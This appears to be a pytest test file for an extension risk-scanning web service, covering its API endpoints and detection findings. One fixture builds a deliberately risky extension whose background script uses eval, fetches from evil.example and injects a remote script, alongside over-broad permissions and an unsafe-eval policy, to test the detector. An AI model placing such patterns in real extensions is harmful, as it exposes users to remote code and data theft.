import io
import json
import zipfile
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from sqlmodel import select
from sqlmodel.ext.asyncio.session import AsyncSession

from app.fetchers.base import ExtensionMetadata, FetchError
from app.models import Extension


def _fake_metadata():
    from datetime import datetime, timezone
    return ExtensionMetadata(
        name="Test Extension",
        publisher="testpub",
        description="A test extension",
        version="1.0.0",
        install_count=50000,
        last_updated=datetime(2023, 6, 1, tzinfo=timezone.utc),
        store_url="https://example.com",
        publisher_verified=True,
    )


def _fake_vsix() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("manifest.json", json.dumps({
            "manifest_version": 3,
            "name": "Test Extension",
            "version": "1.0.0",
            "permissions": ["storage"],
        }))
        zf.writestr("background.js", 'console.log("hello");')
    return buf.getvalue()


def _risky_vsix() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("manifest.json", json.dumps({
            "manifest_version": 2,
            "name": "Risky Extension",
            "version": "1.0.0",
            "permissions": ["tabs", "debugger"],
            "host_permissions": ["<all_urls>"],
            "content_security_policy": "script-src 'self' 'unsafe-eval' http://bad.example *",
        }))
        zf.writestr(
            "background.js",
            "eval('alert(1)');\n"
            "fetch('https://evil.example/data');\n"
            "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';\n",
        )
    return buf.getvalue()


async def test_list_extensions_empty(client):
    r = await client.get("/api/extensions")
    assert r.status_code == 200
    assert r.json() == []


async def test_add_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))

        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.test-ext",
        })

    assert r.status_code == 201
    data = r.json()
    assert data["name"] == "Test Extension"
    assert data["store"] == "vscode"
    assert data["extension_id"] == "testpub.test-ext"
    assert data["risk_score"] is not None
    return data["id"]


async def test_add_extension_returns_and_persists_findings(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))

        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.risky-ext",
        })

    assert r.status_code == 201
    data = r.json()
    codes = {finding["code"] for finding in data["findings"]}
    assert {"eval_usage", "remote_fetch", "dynamic_script_injection", "manifest_v2"} <= codes

    r2 = await client.get(f"/api/extensions/{data['id']}")
    assert r2.status_code == 200
    persisted_codes = {finding["code"] for finding in r2.json()["findings"]}
    assert codes == persisted_codes


async def test_old_package_analysis_without_findings_returns_empty(client, test_db, admin_user):
    async with AsyncSession(test_db) as session:
        ext = Extension(
            user_id=admin_user.id,
            store="vscode",
            extension_id="testpub.old-ext",
            name="Old Extension",
            publisher="testpub",
            version="1.0.0",
            store_url="https://example.com",
            package_analysis=json.dumps({"permissions": [], "host_permissions": []}),
        )
        session.add(ext)
        await session.commit()
        await session.refresh(ext)
        ext_id = ext.id

    r = await client.get(f"/api/extensions/{ext_id}")
    assert r.status_code == 200
    assert r.json()["findings"] == []


async def test_extension_detail_renders_detection_findings(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))
        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.ui-risky",
        })
    ext_id = r.json()["id"]

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    assert b"Detection findings" in page.content
    assert b"eval() usage" in page.content


async def test_extension_detail_handles_old_package_analysis_without_findings(client, test_db, admin_user):
    async with AsyncSession(test_db) as session:
        ext = Extension(
            user_id=admin_user.id,
            store="vscode",
            extension_id="testpub.old-ui",
            name="Old UI Extension",
            publisher="testpub",
            version="1.0.0",
            store_url="https://example.com",
            package_analysis=json.dumps({"permissions": [], "host_permissions": []}),
        )
        session.add(ext)
        await session.commit()
        await session.refresh(ext)
        ext_id = ext.id

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    assert b"Detection findings" not in page.content


async def test_add_extension_duplicate(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))

        await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.dupe-ext",
        })
        r2 = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.dupe-ext",
        })

    assert r2.status_code == 409


async def test_get_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.get-test",
        })
    ext_id = r.json()["id"]

    r2 = await client.get(f"/api/extensions/{ext_id}")
    assert r2.status_code == 200
    assert r2.json()["id"] == ext_id


async def test_delete_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.del-test",
        })
    ext_id = r.json()["id"]

    r_del = await client.delete(f"/api/extensions/{ext_id}")
    assert r_del.status_code == 200
    assert r_del.json() == {"ok": True}

    r_get = await client.get(f"/api/extensions/{ext_id}")
    assert r_get.status_code == 404


async def test_refresh_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.refresh-test",
        })
    ext_id = r.json()["id"]

    with patch("app.fetchers.VSCodeFetcher") as MockFetcher2:
        instance2 = MockFetcher2.return_value
        meta2 = _fake_metadata()
        instance2.fetch = AsyncMock(return_value=(meta2, _fake_vsix()))
        r2 = await client.post(f"/api/extensions/{ext_id}/refresh")

    assert r2.status_code == 200
    assert r2.json()["last_fetched_at"] is not None


async def test_toggle_watchlist(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.watch-test",
        })
    ext_id = r.json()["id"]
    assert r.json()["watchlist"] is True

    r2 = await client.patch(f"/api/extensions/{ext_id}/watchlist", json={"watchlist": False})
    assert r2.status_code == 200
    assert r2.json()["watchlist"] is False


async def test_get_history_empty(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), None))
        r = await client.post("/api/extensions", json={
            "store": "vscode",
            "extension_id": "testpub.hist-test",
        })
    ext_id = r.json()["id"]

    r2 = await client.get(f"/api/extensions/{ext_id}/history")
    assert r2.status_code == 200
    # install_count=50000 so one history entry should exist
    assert isinstance(r2.json(), list)


async def test_unauthenticated_api(anon_client):
    r = await anon_client.get("/api/extensions", follow_redirects=False)
    assert r.status_code == 303
